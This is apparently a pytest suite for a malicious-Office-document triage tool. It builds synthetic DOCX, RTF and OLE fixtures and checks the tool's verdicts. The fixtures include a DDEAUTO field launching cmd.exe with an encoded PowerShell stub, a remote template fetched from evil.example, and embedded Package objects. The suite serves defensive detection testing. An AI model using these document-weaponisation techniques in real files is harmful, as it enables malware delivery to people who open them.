"""test_maldoc_triage — triase dokumen Office aktif (#0211), nol jaringan."""
from __future__ import annotations

import io
import json
import subprocess
import sys
import zipfile
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import maldoc_triage  # noqa: E402


def _make_ooxml(parts: dict[str, str | bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in parts.items():
            data = content.encode("utf-8") if isinstance(content, str) \
                else content
            zf.writestr(name, data)
    return buf.getvalue()


CT_MIN = "[Content_Types].xml"
DOC_XML = "<w:document><w:body><w:p>halo</w:p></w:body></w:document>"
RELS_CORE = ('<Relationship Id="rId1" '
             'Type="http://schemas.openxmlformats.org/officeDocument/2006/'
             'relationships/officeDocument" Target="word/document.xml"/>')
CT_TPL = ("http://schemas.openxmlformats.org/officeDocument/2006/"
          "relationships/attachedTemplate")


def _run(path: Path, *extra: str) -> tuple[int, dict | None]:
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "maldoc_triage.py"), "--doc", str(path),
         *extra], capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out


def test_benign_docx_clean(tmp_path):
    p = tmp_path / "benign.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml": DOC_XML,
    }))
    rc, out = _run(p)
    assert rc == 0 and out["verdict"] == "CLEAN"
    assert out["sha256"] and out["size"] > 0


def test_docm_macro_suspicious(tmp_path):
    p = tmp_path / "macro.docm"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml": DOC_XML,
        "word/vbaProject.bin": b"\x00\x01macro-data",
    }))
    rc, out = _run(p)
    fids = {f["id"]: f["severity"] for f in out["findings"]}
    assert fids.get("ooxml.vba-project") == "info"
    # info saja tidak mengangkat verdict (FP rendah)
    assert out["verdict"] in ("CLEAN", "INCONCLUSIVE")


def test_ddeauto_critical(tmp_path):
    p = tmp_path / "dde.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml":
            '<w:document><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\'
            'cmd.exe "/k powershell -enc AAAA"</w:instrText></w:document>',
    }))
    rc, out = _run(p)
    assert out["verdict"] == "MALICIOUS-LIKELY"
    dde = [f for f in out["findings"] if f["id"] == "ooxml.dde-fieldcode"]
    assert dde and dde[0]["severity"] == "critical"
    assert "DDEAUTO" in dde[0]["evidence"]


def test_remote_template_high(tmp_path):
    p = tmp_path / "tpl.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml":
            '<w:document><w:attachedTemplate r:id="rId5"/></w:document>',
        "word/_rels/document.xml.rels":
            '<Relationships><Relationship Id="rId5" Type="' + CT_TPL +
            '" Target="https://evil.example/template.dotm" '
            'TargetMode="External"/></Relationships>',
    }))
    rc, out = _run(p)
    ids = {f["id"] for f in out["findings"]}
    assert "ooxml.attached-template-remote" in ids
    assert out["verdict"] == "SUSPICIOUS"


def test_attached_template_rel_without_element_clean(tmp_path):
    """Rel attachedTemplate tanpa elemen di dokumen = pola lokal normal."""
    p = tmp_path / "tpl-lokal.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml": DOC_XML,
        "word/_rels/document.xml.rels":
            '<Relationships><Relationship Id="rId5" Type="' + CT_TPL +
            '" Target="Normal.dotm"/></Relationships>',
    }))
    rc, out = _run(p)
    ids = {f["id"] for f in out["findings"]}
    assert "ooxml.attached-template-remote" not in ids
    assert "ooxml.rel-external" not in ids
    assert out["verdict"] == "CLEAN"


def test_hyperlink_external_is_info_only(tmp_path):
    p = tmp_path / "links.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml": DOC_XML,
        "word/_rels/document.xml.rels":
            '<Relationships><Relationship Id="rId2" Type="http://schemas.'
            'openxmlformats.org/officeDocument/2006/relationships/'
            'hyperlink" Target="https://example.com/x" '
            'TargetMode="External"/></Relationships>',
    }))
    rc, out = _run(p)
    hyp = [f for f in out["findings"]
           if f["id"] == "ooxml.hyperlink-external"]
    assert hyp and hyp[0]["severity"] == "info"
    # hanya info -> tetap CLEAN (FP rendah)
    assert out["verdict"] == "CLEAN"


def test_embedded_package_high(tmp_path):
    p = tmp_path / "pkg.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml":
            '<w:document><o:OLEObject Type="Embed" ProgID="Package"/>'
            '</w:document>',
    }))
    rc, out = _run(p)
    assert out["verdict"] == "SUSPICIOUS"
    pkg = [f for f in out["findings"]
           if f["id"] == "ooxml.embedded-oleobject"]
    assert pkg and pkg[0]["severity"] == "high"


def test_corrupt_zip_inconclusive_not_clean(tmp_path):
    p = tmp_path / "korup.docx"
    p.write_bytes(b"PK\x03\x04" + b"\x00" * 64)
    rc, out = _run(p)
    assert rc == 0 and out["verdict"] == "INCONCLUSIVE"
    assert any(f["id"] == "limits" for f in out["findings"])


def test_unknown_format_exit2(tmp_path):
    p = tmp_path / "tanduk.bin"
    p.write_bytes(b"\x00\x01\x02\x03bukan-format")
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "maldoc_triage.py"), "--doc", str(p)],
        capture_output=True, text=True)
    assert proc.returncode == 2 and "dikenali" in proc.stderr


def test_missing_file_exit2(tmp_path):
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "maldoc_triage.py"),
         "--doc", str(tmp_path / "tiada.docx")],
        capture_output=True, text=True)
    assert proc.returncode == 2


def test_ole_magic_inconclusive(tmp_path):
    p = tmp_path / "lama.doc"
    p.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 512)
    rc, out = _run(p)
    # deteksi dangkal OLE tidak boleh mengklaim CLEAN
    assert rc == 0 and out["verdict"] == "INCONCLUSIVE"


def test_rtf_objdata_high(tmp_path):
    p = tmp_path / "evil.rtf"
    p.write_bytes(b"{\\rtf1 {\\object\\objupdate\\objclass Package "
                  b"{\\objdata 01050000}}}")
    rc, out = _run(p)
    ids = {f["id"]: f["severity"] for f in out["findings"]}
    assert ids.get("rtf.objdata") == "high"
    assert ids.get("rtf.objupdate") == "medium"
    # objdata high + objclass Package high = >=2 high
    assert out["verdict"] == "MALICIOUS-LIKELY"


def test_fail_on_gate(tmp_path):
    p = tmp_path / "dde.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml":
            '<w:document><w:instrText>DDEAUTO x y</w:instrText>'
            '</w:document>',
    }))
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "maldoc_triage.py"), "--doc", str(p),
         "--out", str(tmp_path / "triage.json")],
        capture_output=True, text=True)
    assert proc.returncode == 1  # MALICIOUS-LIKELY >= default fail-on
    saved = json.loads((tmp_path / "triage.json").read_text(encoding="utf-8"))
    assert saved["verdict"] == "MALICIOUS-LIKELY"


def test_out_file_and_read_only(tmp_path):
    p = tmp_path / "b.docx"
    p.write_bytes(_make_ooxml({
        CT_MIN: "<Types/>",
        "_rels/.rels": f'<?xml?>{RELS_CORE}',
        "word/document.xml": DOC_XML,
    }))
    before = p.read_bytes()
    rc, out = _run(p, "--out", str(tmp_path / "o.json"))
    assert rc == 0 and p.read_bytes() == before  # read-only
    assert (tmp_path / "o.json").is_file()
